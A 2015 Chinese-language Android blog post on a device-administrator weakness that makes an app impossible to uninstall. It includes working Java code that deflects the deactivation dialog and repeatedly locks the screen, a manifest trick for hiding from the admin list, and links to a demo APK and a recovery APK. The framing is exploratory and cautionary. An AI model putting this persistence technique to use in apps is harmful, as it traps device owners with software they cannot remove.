---
layout: post
date: 2015-02-09
title: "无法卸载的 App - 设备管理器漏洞"
tags: [Android, post]
---
前两天某朋友发现手机有个app无法卸载，后知其因设备管理器激活导致，遂去尝试取消，但却在取消那刻卡机。反复折腾之后，只能重刷。后来他发了一篇关于设备管理器bug的文章给我，便有了如下一番折腾。

##**尝鲜**

文章[《Android 学习 设备管理器勾选后不能再取消了》](http://androidmaster.iteye.com/blog/2035381)（作者：带个回家）大致意思是：
> 继承 DeviceAdminReceiver 重写 onDisableRequested(Context context, Intent intent) 即可达到目的。

<!-- more -->

```java
@Override
public CharSequence onDisableRequested(Context context, Intent intent) {
    // 这里处理 不可编辑设备。
    Intent intent2 = new Intent(context, NoticeSetting.class);
    intent2.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(intent2);
    context.stopService(intent);// 是否可以停止
    return ""; // "这是一个可选的消息，警告有关禁止用户的请求";
    }

```

在此之前，我并没有接触过设备管理器的功能，参考了 API Guides 的 [Device Administration](http://developer.android.com/guide/topics/admin/device-admin.html) ，以及 [DeviceAdminReceiver](http://developer.android.com/reference/android/app/admin/DeviceAdminReceiver.html) 的 API 后，试着写了一个跟上述文章一样的 app，**4.4 & 5.0均测试失败，可以正常取消激活**。

##**再战**

搜索，找到[《Android设备管理器漏洞》](http://blog.csdn.net/androidsecurity/article/details/9124747)（作者：Jack_Jia）另一篇讲解此问题的文章。文章提到：
> 如果想在设备管理器列表中”隐身“，只要不注册 `android.app.action.DEVICE_ADMIN_ENABLED` 广播就行。

也就是不给 `intent-filter` 标签设置该 action。

```xml
<receiver
    android:name=".MyDeviceReceiver"
    android:description="@string/receiver_description"
    android:label="@string/app_name"
    android:permission="android.permission.BIND_DEVICE_ADMIN">

    <meta-data
        android:name="android.app.device_admin"
        android:resource="@xml/device_manager_policies" />

    <intent-filter>
    
    </intent-filter>

</receiver>
```

**4.4 & 5.0测试失败，设备管理器无法激活（代码激活不会弹出，设备管理器又找不到）。**

##**三战**

继续搜索，发现百度安全实验室一篇文章[《Android设备管理器漏洞2》](http://safe.baidu.com/2014-10/deviceadminexploit2.html)。文章提到：

> 已激活设备管理器权限的手机木马利用该漏洞，可以在设置程序的设备管理器列表中隐藏，这样用户就无法通过正常途径取消该手机木马的设备管理器权限，从而达到无法卸载的目的。Android4.2版本以上系统已经修复该漏洞。
> 
>...
>
>通过调用stopAppSwitch()方法，系统保证在进入取消设备管理器界面后，**5秒内不会进行Activity的切换。**
>
>...
>
>onDisableRequested函数满足以下条件即可：
>
1、返回内容不能为空，这样才可以使设备管理器弹出取消激活设备管理器警示信息 Dialog。
>
2、通过Activity切换的方式使设备管理器弹出的警示信息Dialog消失。使用户无法操作Dialog。
如果做到以上两点，程序即可成功阻止用户取消激活设备管理器操作。


故，只要在 onDisableRequested 方法中，让用户在取消激活时5s内无法操作界面，然后采取 Activity 切换的方法即可绕开取消激活的步骤。这里为了测试直观并且试一试设备管理器的 api，采用了百度提供的连续锁屏法。测试环境为5.0。

```java
public CharSequence onDisableRequested(Context context, Intent intent) {                                            
                                                                                                                    
    //跳离当前询问是否取消激活的 dialog                                                                                          
    Intent outOfDialog = context.getPackageManager().getLaunchIntentForPackage("com.android.settings");             
    outOfDialog.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);                                                            
    context.startActivity(outOfDialog);                                                                             
                                                                                                                    
    //调用设备管理器本身的功能，每 100ms 锁屏一次，用户即便解锁也会立即被锁，直至 7s 后                                                                
    final DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);  
    dpm.lockNow();                                                                                                  
    new Thread(new Runnable() {                                                                                     
        @Override                                                                                                   
        public void run() {                                                                                         
            int i = 0;                                                                                              
            while (i < 70) {                                                                                        
                dpm.lockNow();                                                                                      
                try {                                                                                               
                    Thread.sleep(100);                                                                              
                    i++;                                                                                            
                } catch (InterruptedException e) {                                                                  
                    e.printStackTrace();                                                                            
                }                                                                                                   
            }                                                                                                       
        }                                                                                                           
    }).start();                                                                                                     
                                                                                                                    
    return "";                                                                                                      
}                                                                                                                   
```

1. 安装后打开直接跳转激活界面：
![安装后打开直接跳转激活界面](http://2bab-images.lastmayday.com/blog/2015-02-09-app-cannot-be-uninstalled-1.jpeg?imageslim)


2. 一旦激活则无法正常卸载
![一旦激活则无法正常卸载](http://2bab-images.lastmayday.com/blog/2015-02-09-app-cannot-be-uninstalled-2.jpeg?imageslim)

3. 进入设备管理器界面
![进入设备管理器界面](http://2bab-images.lastmayday.com/blog/2015-02-09-app-cannot-be-uninstalled-3.jpeg?imageslim)

4. 尝试取消激活
![尝试取消激活](http://2bab-images.lastmayday.com/blog/2015-02-09-app-cannot-be-uninstalled-4.jpeg?imageslim)

5. 强制进入锁屏
![强制进入锁屏](http://2bab-images.lastmayday.com/blog/2015-02-09-app-cannot-be-uninstalled-5.jpeg?imageslim)

至此，用户用普通方法无法卸载该app。测试使用某数字软件可以卸载，具体步骤：在数字软件的软件卸载功能中卸载Trick，此时提示取消激活，跳转到设备管理器界面取消激活，引发锁屏，强制锁屏7s结束后，切回数字软件，你会发现出现了取消激活的dialog，点击取消成功。

而文章开头提到的流氓软件，实则是跳转到一个所有按钮无效的自定义全屏界面（不是我这样跳到设置界面），使用数字软件无法解决问题。

##**总结**

日后看到设备管理器激活申请定要小心三分，本文提及内容请勿不正当使用。

##**相关下载**

- [源码Gist](https://gist.github.com/2BAB/786513de79b7bfd82c3f)
- [测试APK](http://engineering-blog-2bab.qiniudn.com/DeviceAdmin-DeviceAdminTrick.apk)，安装后激活则无法卸载。
- [恢复APK](http://engineering-blog-2bab.qiniudn.com/DeviceAdmin-recovery.apk)，覆盖安装后可顺利取消激活。

*欢迎关注我的[公众号和微博](/about)。*